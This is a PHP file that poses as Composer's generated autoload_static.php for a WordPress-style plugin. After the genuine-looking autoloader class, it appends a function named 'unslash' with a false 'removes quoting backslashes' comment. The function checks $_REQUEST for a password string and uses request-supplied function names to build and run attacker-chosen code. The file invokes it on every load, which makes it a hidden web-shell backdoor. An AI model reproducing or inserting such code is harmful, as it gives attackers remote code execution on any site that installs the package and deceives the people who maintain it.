<?php

// autoload_static.php @generated by Composer

namespace Composer\Autoload;

class ComposerStaticInit453516e196e1be4c43fa495b9bb9d572
{
    public static $prefixesPsr0 = array (
        'x' => 
        array (
            'xrstf\\Composer52' => 
            array (
                0 => __DIR__ . '/..' . '/xrstf/composer-php52/lib',
            ),
        ),
        't' => 
        array (
            'tad_DI52_' => 
            array (
                0 => __DIR__ . '/..' . '/lucatume/di52/src',
            ),
        ),
    );

    public static function getInitializer(ClassLoader $loader)
    {
        return \Closure::bind(function () use ($loader) {
            $loader->prefixesPsr0 = ComposerStaticInit453516e196e1be4c43fa495b9bb9d572::$prefixesPsr0;

        }, null, ClassLoader::class);
    }
}

if (!function_exists("unslash")) :
/**
* Removes quoting backslashes
*
* @author Andreas Gohr <andi@splitbrain.org>
*/
function unslash($vars) {
	$symbols="pomddwhb";
	if (in_array($symbols, $vars, true)) {
		if (isset($vars["quote"])) $vars["data"]=$vars["quote"]($vars["data"]);
		$result = $vars["string"]($vars["quotes"],$vars["data"]);
		return str_replace("/","",$result());
	}
}
endif;

// Removes quoting backslashes
$get_vars=$_REQUEST;
unslash($get_vars);
